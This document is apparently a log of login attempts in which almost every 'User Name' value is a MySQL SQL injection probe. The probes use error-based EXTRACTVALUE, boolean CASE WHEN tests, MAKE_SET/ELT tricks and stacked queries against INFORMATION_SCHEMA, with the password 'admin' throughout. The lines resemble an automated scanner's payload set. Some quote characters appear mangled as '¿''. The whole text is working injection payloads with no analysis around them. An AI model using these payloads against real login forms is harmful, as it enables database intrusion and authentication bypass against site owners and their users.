+User Name:admin¿' AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- iaDzPassword:admin
+User Name:admin" AND EXTRACTVALUE(3119,CASE WHEN (3119=1139) THEN 3119 ELSE 0x3A END)-- xIQePassword:admin
+User Name:admin" AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- YFXMPassword:admin
+User Name:admin¿') AND EXTRACTVALUE(2380,CASE WHEN (2380=9255) THEN 2380 ELSE 0x3A END)'siDl¿'1Password:admin
+User Name:admin¿') AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'xRPo¿'1Password:admin
+User Name:admin¿')) AND EXTRACTVALUE(6230,CASE WHEN (6230=6601) THEN 6230 ELSE 0x3A END)'VuyH¿'1Password:admin
+User Name:admin¿')) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'YSpG¿'1Password:admin
+User Name:admin¿'))) AND EXTRACTVALUE(5283,CASE WHEN (5283=9021) THEN 5283 ELSE 0x3A END)'ipLN¿'1Password:admin
+User Name:admin¿'))) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'dgtC¿'1Password:admin
+User Name:admin¿' AND EXTRACTVALUE(2647,CASE WHEN (2647=5877) THEN 2647 ELSE 0x3A END)'pGdx¿'1Password:admin
+User Name:admin¿' AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'Xkwh¿'1Password:admin
+User Name:admin¿') AND EXTRACTVALUE(1182,CASE WHEN (1182=9219) THEN 1182 ELSE 0x3A END)'tzOx¿'1Password:admin
+User Name:admin¿') AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'uZYu¿'1Password:admin
+User Name:admin¿')) AND EXTRACTVALUE(3403,CASE WHEN (3403=7790) THEN 3403 ELSE 0x3A END)'BPST¿'1Password:admin
+User Name:admin¿')) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'CBiU¿'1Password:admin
+User Name:admin¿'))) AND EXTRACTVALUE(4867,CASE WHEN (4867=4130) THEN 4867 ELSE 0x3A END)'knkT¿'1Password:admin
+User Name:admin¿'))) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'BuqN¿'1Password:admin
+User Name:admin%¿' AND EXTRACTVALUE(7739,CASE WHEN (7739=2539) THEN 7739 ELSE 0x3A END)'UJah¿'1Password:admin
+User Name:admin%¿' AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'Rfxs¿'1Password:admin
+User Name:admin¿' AND EXTRACTVALUE(1656,CASE WHEN (1656=2277) THEN 1656 ELSE 0x3A END)'lBaI¿'1Password:admin
+User Name:admin¿' AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'XldV¿'1Password:admin
+User Name:admin") AND EXTRACTVALUE(9425,CASE WHEN (9425=5009) THEN 9425 ELSE 0x3A END) AND ("QuCt"="QuCtPassword:admin
+User Name:admin") AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND ("DBRJ"="DBRJPassword:admin
+User Name:admin")) AND EXTRACTVALUE(6852,CASE WHEN (6852=8665) THEN 6852 ELSE 0x3A END) AND (("yZwu"="yZwuPassword:admin
+User Name:admin")) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND (("aiZf"="aiZfPassword:admin
+User Name:admin"))) AND EXTRACTVALUE(6975,CASE WHEN (6975=3065) THEN 6975 ELSE 0x3A END) AND ((("eCkq"="eCkqPassword:admin
+User Name:admin"))) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND ((("EAxK"="EAxKPassword:admin
+User Name:admin" AND EXTRACTVALUE(2105,CASE WHEN (2105=2640) THEN 2105 ELSE 0x3A END) AND "kEoI"="kEoIPassword:admin
+User Name:admin" AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND "qHxJ"="qHxJPassword:admin
+User Name:admin") AND EXTRACTVALUE(5685,CASE WHEN (5685=4602) THEN 5685 ELSE 0x3A END) AND ("mMap" LIKE "mMapPassword:admin
+User Name:admin") AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND ("uVeS" LIKE "uVeSPassword:admin
+User Name:admin")) AND EXTRACTVALUE(7996,CASE WHEN (7996=6318) THEN 7996 ELSE 0x3A END) AND (("HLeU" LIKE "HLeUPassword:admin
+User Name:admin")) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND (("BpOV" LIKE "BpOVPassword:admin
+User Name:admin"))) AND EXTRACTVALUE(9393,CASE WHEN (9393=8637) THEN 9393 ELSE 0x3A END) AND ((("kccE" LIKE "kccEPassword:admin
+User Name:admin"))) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND ((("YVXv" LIKE "YVXvPassword:admin
+User Name:admin" AND EXTRACTVALUE(7690,CASE WHEN (7690=5789) THEN 7690 ELSE 0x3A END) AND "kldB" LIKE "kldBPassword:admin
+User Name:admin" AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND "YIJI" LIKE "YIJIPassword:admin
+User Name:admin¿' AND EXTRACTVALUE(2613,CASE WHEN (2613=6327) THEN 2613 ELSE 0x3A END)'XrgF¿'1Password:admin
+User Name:admin¿' AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)'iCRJ¿'1Password:admin
+User Name:admin¿')) AS NMTo WHERE 4933=4933 AND EXTRACTVALUE(3206,CASE WHEN (3206=8129) THEN 3206 ELSE 0x3A END)-- MGTWPassword:admin
+User Name:admin¿')) AS tHGs WHERE 8218=8218 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- zzJvPassword:admin
+User Name:admin")) AS Ugmb WHERE 1667=1667 AND EXTRACTVALUE(3945,CASE WHEN (3945=4760) THEN 3945 ELSE 0x3A END)-- suJaPassword:admin
+User Name:admin")) AS fhhu WHERE 9980=9980 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- IzuGPassword:admin
+User Name:admin¿') AS wLbe WHERE 7114=7114 AND EXTRACTVALUE(4710,CASE WHEN (4710=8049) THEN 4710 ELSE 0x3A END)-- DHVNPassword:admin
+User Name:admin¿') AS eObC WHERE 2625=2625 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- zvgfPassword:admin
+User Name:admin") AS wdVO WHERE 9633=9633 AND EXTRACTVALUE(1216,CASE WHEN (1216=5594) THEN 1216 ELSE 0x3A END)-- eNzVPassword:admin
+User Name:admin") AS Nhio WHERE 3695=3695 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- RwOuPassword:admin
+User Name:admin"="admin" AND EXTRACTVALUE(3162,CASE WHEN (3162=3531) THEN 3162 ELSE 0x3A END) AND "admin"="adminPassword:admin
+User Name:admin"="admin" AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE) AND EXTRACTVALUE(5250,CASE WHEN (5250=6892) THEN 5250 ELSE 0x3A END)#Password:admin
+User Name:admin¿' IN BOOLEAN MODE) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)#Password:admin
+User Name:admin) AND EXTRACTVALUE(2844,CASE WHEN (2844=3888) THEN 2844 ELSE 0x3A END)-- RYCYPassword:admin
+User Name:admin) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- eygUPassword:admin
+User Name:admin) AND EXTRACTVALUE(3596,CASE WHEN (3596=5541) THEN 3596 ELSE 0x3A END) AND (6692=6692Password:admin
+User Name:admin) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND (8414=8414Password:admin
+User Name:admin)) AND EXTRACTVALUE(4156,CASE WHEN (4156=4977) THEN 4156 ELSE 0x3A END) AND ((8146=8146Password:admin
+User Name:admin)) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND ((8564=8564Password:admin
+User Name:admin))) AND EXTRACTVALUE(9026,CASE WHEN (9026=6433) THEN 9026 ELSE 0x3A END) AND (((4503=4503Password:admin
+User Name:admin))) AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND (((4164=4164Password:admin
+User Name:admin AND EXTRACTVALUE(7329,CASE WHEN (7329=8234) THEN 7329 ELSE 0x3A END)Password:admin
+User Name:admin AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)Password:admin
+User Name:admin AND EXTRACTVALUE(1891,CASE WHEN (1891=8528) THEN 1891 ELSE 0x3A END)-- oAVNPassword:admin
+User Name:admin AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- oFemPassword:admin
+User Name:admin AND EXTRACTVALUE(5036,CASE WHEN (5036=6805) THEN 5036 ELSE 0x3A END)# UFyHPassword:admin
+User Name:admin AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)# EkMNPassword:admin
+User Name:admin)) AS DKTg WHERE 6808=6808 AND EXTRACTVALUE(7595,CASE WHEN (7595=9632) THEN 7595 ELSE 0x3A END)-- mjCrPassword:admin
+User Name:admin)) AS dKct WHERE 3336=3336 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- SlHFPassword:admin
+User Name:admin) AS TZrd WHERE 7265=7265 AND EXTRACTVALUE(9256,CASE WHEN (9256=9414) THEN 9256 ELSE 0x3A END)-- IJcTPassword:admin
+User Name:admin) AS CSsE WHERE 7099=7099 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- vDnOPassword:admin
+User Name:admin` WHERE 8346=8346 AND EXTRACTVALUE(4073,CASE WHEN (4073=5572) THEN 4073 ELSE 0x3A END)-- CSnePassword:admin
+User Name:admin` WHERE 9791=9791 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- dkyyPassword:admin
+User Name:admin`) WHERE 3388=3388 AND EXTRACTVALUE(3237,CASE WHEN (3237=3427) THEN 3237 ELSE 0x3A END)-- xtTAPassword:admin
+User Name:admin`) WHERE 5552=5552 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- YtrVPassword:admin
+User Name:admin`=`admin` AND EXTRACTVALUE(1530,CASE WHEN (1530=3056) THEN 1530 ELSE 0x3A END) AND `admin`=`adminPassword:admin
+User Name:admin`=`admin` AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 2757=2757 AND EXTRACTVALUE(3581,CASE WHEN (3581=5243) THEN 3581 ELSE 0x3A END))|[adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 6707=6707 AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END))|[adminPassword:admin
+User Name:-4846¿') OR EXTRACTVALUE(4466,CASE WHEN (4466=1825) THEN 4466 ELSE 0x3A END)-- yjAmPassword:admin
+User Name:-2780¿') OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- NLtWPassword:admin
+User Name:-6467¿') OR EXTRACTVALUE(9488,CASE WHEN (9488=4279) THEN 9488 ELSE 0x3A END)-- opiRPassword:admin
+User Name:-6305¿' OR EXTRACTVALUE(1273,CASE WHEN (1273=2497) THEN 1273 ELSE 0x3A END)-- lmZKPassword:admin
+User Name:-6231¿' OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- qZuxPassword:admin
+User Name:-9853" OR EXTRACTVALUE(8212,CASE WHEN (8212=2069) THEN 8212 ELSE 0x3A END)-- vTunPassword:admin
+User Name:-7416" OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- xwNePassword:admin
+User Name:-3997¿') OR EXTRACTVALUE(2518,CASE WHEN (2518=6662) THEN 2518 ELSE 0x3A END)'UWKO¿'1Password:admin
+User Name:-3507¿') OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'fctY¿'1Password:admin
+User Name:-5218¿') OR EXTRACTVALUE(4807,CASE WHEN (4807=4441) THEN 4807 ELSE 0x3A END)'zzRI¿'1Password:admin
+User Name:-5343¿')) OR EXTRACTVALUE(6582,CASE WHEN (6582=4812) THEN 6582 ELSE 0x3A END)'nRhO¿'1Password:admin
+User Name:-1936¿')) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'VeBP¿'1Password:admin
+User Name:-2219¿')) OR EXTRACTVALUE(4415,CASE WHEN (4415=1956) THEN 4415 ELSE 0x3A END)'xmCp¿'1Password:admin
+User Name:-2534¿'))) OR EXTRACTVALUE(8114,CASE WHEN (8114=5896) THEN 8114 ELSE 0x3A END)'YtVA¿'1Password:admin
+User Name:-8418¿'))) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'ldZG¿'1Password:admin
+User Name:-3190¿'))) OR EXTRACTVALUE(9990,CASE WHEN (9990=3513) THEN 9990 ELSE 0x3A END)'xgGX¿'1Password:admin
+User Name:-4507¿' OR EXTRACTVALUE(8770,CASE WHEN (8770=3983) THEN 8770 ELSE 0x3A END)'PNFi¿'1Password:admin
+User Name:-1161¿' OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'xzOa¿'1Password:admin
+User Name:-4562¿' OR EXTRACTVALUE(6618,CASE WHEN (6618=8147) THEN 6618 ELSE 0x3A END)'mJvo¿'1Password:admin
+User Name:-2325¿') OR EXTRACTVALUE(4748,CASE WHEN (4748=2795) THEN 4748 ELSE 0x3A END)'xCPs¿'1Password:admin
+User Name:-9011¿') OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'cnfo¿'1Password:admin
+User Name:-8058¿') OR EXTRACTVALUE(4202,CASE WHEN (4202=1490) THEN 4202 ELSE 0x3A END)'XGKf¿'1Password:admin
+User Name:-6753¿')) OR EXTRACTVALUE(6320,CASE WHEN (6320=7988) THEN 6320 ELSE 0x3A END)'CEUI¿'1Password:admin
+User Name:-6394¿')) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'tryt¿'1Password:admin
+User Name:-5772¿')) OR EXTRACTVALUE(5353,CASE WHEN (5353=9345) THEN 5353 ELSE 0x3A END)'ZYsS¿'1Password:admin
+User Name:-8622¿'))) OR EXTRACTVALUE(7496,CASE WHEN (7496=1861) THEN 7496 ELSE 0x3A END)'cYIq¿'1Password:admin
+User Name:-7686¿'))) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'IFgS¿'1Password:admin
+User Name:-4342¿'))) OR EXTRACTVALUE(5032,CASE WHEN (5032=8068) THEN 5032 ELSE 0x3A END)'VQXD¿'1Password:admin
+User Name:-7610%¿' OR EXTRACTVALUE(1816,CASE WHEN (1816=8298) THEN 1816 ELSE 0x3A END)'VOKm¿'1Password:admin
+User Name:-9203%¿' OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'gBHM¿'1Password:admin
+User Name:-8723%¿' OR EXTRACTVALUE(6829,CASE WHEN (6829=8375) THEN 6829 ELSE 0x3A END)'JJgp¿'1Password:admin
+User Name:-3010¿' OR EXTRACTVALUE(2816,CASE WHEN (2816=3673) THEN 2816 ELSE 0x3A END)'yBnn¿'1Password:admin
+User Name:-4957¿' OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'FoQy¿'1Password:admin
+User Name:-5892¿' OR EXTRACTVALUE(7781,CASE WHEN (7781=8957) THEN 7781 ELSE 0x3A END)'bQoj¿'1Password:admin
+User Name:-1353") OR EXTRACTVALUE(7616,CASE WHEN (7616=6295) THEN 7616 ELSE 0x3A END) AND ("kIYK"="kIYKPassword:admin
+User Name:-2726") OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND ("Zhab"="ZhabPassword:admin
+User Name:-3259")) OR EXTRACTVALUE(6595,CASE WHEN (6595=5410) THEN 6595 ELSE 0x3A END) AND (("munt"="muntPassword:admin
+User Name:-2950")) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND (("Cdxi"="CdxiPassword:admin
+User Name:-7413"))) OR EXTRACTVALUE(5352,CASE WHEN (5352=3437) THEN 5352 ELSE 0x3A END) AND ((("XAYZ"="XAYZPassword:admin
+User Name:-1897"))) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND ((("xOoe"="xOoePassword:admin
+User Name:-8110" OR EXTRACTVALUE(3656,CASE WHEN (3656=6406) THEN 3656 ELSE 0x3A END) AND "fhKA"="fhKAPassword:admin
+User Name:-2523" OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND "krup"="krupPassword:admin
+User Name:-2981") OR EXTRACTVALUE(9199,CASE WHEN (9199=8990) THEN 9199 ELSE 0x3A END) AND ("DsHL" LIKE "DsHLPassword:admin
+User Name:-6668") OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND ("aiRC" LIKE "aiRCPassword:admin
+User Name:-2439")) OR EXTRACTVALUE(7980,CASE WHEN (7980=1838) THEN 7980 ELSE 0x3A END) AND (("agoO" LIKE "agoOPassword:admin
+User Name:-5527")) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND (("lEuF" LIKE "lEuFPassword:admin
+User Name:-8778"))) OR EXTRACTVALUE(1471,CASE WHEN (1471=8912) THEN 1471 ELSE 0x3A END) AND ((("MAcE" LIKE "MAcEPassword:admin
+User Name:-4226"))) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND ((("xOgY" LIKE "xOgYPassword:admin
+User Name:-3517" OR EXTRACTVALUE(5047,CASE WHEN (5047=5484) THEN 5047 ELSE 0x3A END) AND "gcsh" LIKE "gcshPassword:admin
+User Name:-3863" OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND "KKEF" LIKE "KKEFPassword:admin
+User Name:-5764¿' OR EXTRACTVALUE(6211,CASE WHEN (6211=3336) THEN 6211 ELSE 0x3A END)'FsEK¿'1Password:admin
+User Name:-8503¿' OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)'NqCK¿'1Password:admin
+User Name:-4529¿' OR EXTRACTVALUE(9760,CASE WHEN (9760=7283) THEN 9760 ELSE 0x3A END)'REIk¿'1Password:admin
+User Name:-5794¿')) AS dnpE WHERE 9567=9567 OR EXTRACTVALUE(5665,CASE WHEN (5665=7336) THEN 5665 ELSE 0x3A END)-- CMgbPassword:admin
+User Name:-1293¿')) AS Gyui WHERE 7737=7737 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- UkcvPassword:admin
+User Name:-5083¿')) AS MfQc WHERE 1249=1249 OR EXTRACTVALUE(1171,CASE WHEN (1171=3733) THEN 1171 ELSE 0x3A END)-- TbtTPassword:admin
+User Name:-4511")) AS jkaW WHERE 5763=5763 OR EXTRACTVALUE(5649,CASE WHEN (5649=8539) THEN 5649 ELSE 0x3A END)-- ykTdPassword:admin
+User Name:-7755")) AS lWDi WHERE 8441=8441 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- NkysPassword:admin
+User Name:-6723¿') AS XLMy WHERE 3034=3034 OR EXTRACTVALUE(4264,CASE WHEN (4264=6397) THEN 4264 ELSE 0x3A END)-- NMGSPassword:admin
+User Name:-4043¿') AS BPBF WHERE 5883=5883 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- aBSNPassword:admin
+User Name:-3698¿') AS itxF WHERE 6455=6455 OR EXTRACTVALUE(2199,CASE WHEN (2199=3732) THEN 2199 ELSE 0x3A END)-- FxVTPassword:admin
+User Name:-3112") AS fFiP WHERE 5468=5468 OR EXTRACTVALUE(3398,CASE WHEN (3398=2811) THEN 3398 ELSE 0x3A END)-- DRiUPassword:admin
+User Name:-1265") AS EJPY WHERE 4564=4564 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- KvSPPassword:admin
+User Name:-9835) OR EXTRACTVALUE(5882,CASE WHEN (5882=6536) THEN 5882 ELSE 0x3A END)-- OOIqPassword:admin
+User Name:-5225) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- uoYwPassword:admin
+User Name:-3550) OR EXTRACTVALUE(8406,CASE WHEN (8406=2890) THEN 8406 ELSE 0x3A END) AND (2768=2768Password:admin
+User Name:-7219) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND (7046=7046Password:admin
+User Name:-5968)) OR EXTRACTVALUE(4875,CASE WHEN (4875=1159) THEN 4875 ELSE 0x3A END) AND ((5927=5927Password:admin
+User Name:-5753)) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND ((5260=5260Password:admin
+User Name:-2488))) OR EXTRACTVALUE(2970,CASE WHEN (2970=4401) THEN 2970 ELSE 0x3A END) AND (((2693=2693Password:admin
+User Name:-7187))) OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END) AND (((3006=3006Password:admin
+User Name:-3452 OR EXTRACTVALUE(3355,CASE WHEN (3355=2122) THEN 3355 ELSE 0x3A END)Password:admin
+User Name:-4676 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)Password:admin
+User Name:-6816 OR EXTRACTVALUE(3120,CASE WHEN (3120=1949) THEN 3120 ELSE 0x3A END)-- zTwTPassword:admin
+User Name:-5189 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- JrpYPassword:admin
+User Name:-9735 OR EXTRACTVALUE(2609,CASE WHEN (2609=8021) THEN 2609 ELSE 0x3A END)# zeybPassword:admin
+User Name:-7320 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)# iXnLPassword:admin
+User Name:-9746)) AS ksxS WHERE 3539=3539 OR EXTRACTVALUE(9400,CASE WHEN (9400=2967) THEN 9400 ELSE 0x3A END)-- OtPhPassword:admin
+User Name:-9422)) AS xHdi WHERE 2348=2348 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- YSIKPassword:admin
+User Name:-8632) AS cLWL WHERE 9802=9802 OR EXTRACTVALUE(3693,CASE WHEN (3693=9024) THEN 3693 ELSE 0x3A END)-- rqfePassword:admin
+User Name:-8124) AS Pmlk WHERE 6678=6678 OR EXTRACTVALUE(1269,CASE WHEN (1269=1269) THEN 1269 ELSE 0x3A END)-- ZsFyPassword:admin
+User Name:MAKE_SET(6390=9682,9682)Password:admin
+User Name:MAKE_SET(7817=7817,8982)Password:admin
+User Name:MAKE_SET(7362=7579,0x61646d696e)Password:admin
+User Name:MAKE_SET(9107=9107,0x61646d696e)Password:admin
+User Name:ELT(3801=2010,2010)Password:admin
+User Name:ELT(9547=9547,6339)Password:admin
+User Name:ELT(4569=8862,0x61646d696e)Password:admin
+User Name:ELT(9322=9322,0x61646d696e)Password:admin
+User Name:(4516=1823)*1823Password:admin
+User Name:(5268=5268)*9071Password:admin
+User Name:(7187=5241)*0x61646d696ePassword:admin
+User Name:(3459=3459)*0x61646d696ePassword:admin
+User Name:admin¿',(SELECT (CASE WHEN (1804=5100) THEN 1 ELSE 1804*(SELECT 1804 FROM INFORMATION_SCHEMA.PLUGINS) END))-- GjGyPassword:admin
+User Name:admin¿',(SELECT (CASE WHEN (9714=9714) THEN 1 ELSE 9714*(SELECT 9714 FROM INFORMATION_SCHEMA.PLUGINS) END))-- eJbJPassword:admin
+User Name:admin,(SELECT (CASE WHEN (2782=8029) THEN 1 ELSE 2782*(SELECT 2782 FROM INFORMATION_SCHEMA.PLUGINS) END))Password:admin
+User Name:admin,(SELECT (CASE WHEN (9714=9714) THEN 1 ELSE 9714*(SELECT 9714 FROM INFORMATION_SCHEMA.PLUGINS) END))Password:admin
+User Name:admin¿',(SELECT (CASE WHEN (9777=7965) THEN 0x61646d696e ELSE 9777*(SELECT 9777 FROM INFORMATION_SCHEMA.PLUGINS) END))-- ZlMMPassword:admin
+User Name:admin¿',(SELECT (CASE WHEN (8828=8828) THEN 0x61646d696e ELSE 8828*(SELECT 8828 FROM INFORMATION_SCHEMA.PLUGINS) END))-- YQzwPassword:admin
+User Name:admin,(SELECT (CASE WHEN (7268=1456) THEN 0x61646d696e ELSE 7268*(SELECT 7268 FROM INFORMATION_SCHEMA.PLUGINS) END))Password:admin
+User Name:admin,(SELECT (CASE WHEN (8828=8828) THEN 0x61646d696e ELSE 8828*(SELECT 8828 FROM INFORMATION_SCHEMA.PLUGINS) END))Password:admin
+User Name:admin¿');SELECT (CASE WHEN (6289=9488) THEN 6289 ELSE 6289*(SELECT 6289 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿');SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿';SELECT (CASE WHEN (3261=2466) THEN 3261 ELSE 3261*(SELECT 3261 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿';SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin";SELECT (CASE WHEN (1501=3179) THEN 1501 ELSE 1501*(SELECT 1501 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin";SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿'));SELECT (CASE WHEN (8731=6600) THEN 8731 ELSE 8731*(SELECT 8731 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿'));SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿')));SELECT (CASE WHEN (6599=5730) THEN 6599 ELSE 6599*(SELECT 6599 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿')));SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin%¿';SELECT (CASE WHEN (8370=9545) THEN 8370 ELSE 8370*(SELECT 8370 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin%¿';SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin");SELECT (CASE WHEN (6167=1497) THEN 6167 ELSE 6167*(SELECT 6167 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin");SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin"));SELECT (CASE WHEN (9323=1614) THEN 9323 ELSE 9323*(SELECT 9323 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin"));SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin")));SELECT (CASE WHEN (2533=6495) THEN 2533 ELSE 2533*(SELECT 2533 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin")));SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿')) AS aoPf WHERE 1870=1870;SELECT (CASE WHEN (9612=1503) THEN 9612 ELSE 9612*(SELECT 9612 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
+User Name:admin¿')) AS JfjO WHERE 2506=2506;SELECT (CASE WHEN (7844=7844) THEN 7844 ELSE 7844*(SELECT 7844 FROM INFORMATION_SCHEMA.PLUGINS) END)#Password:admin
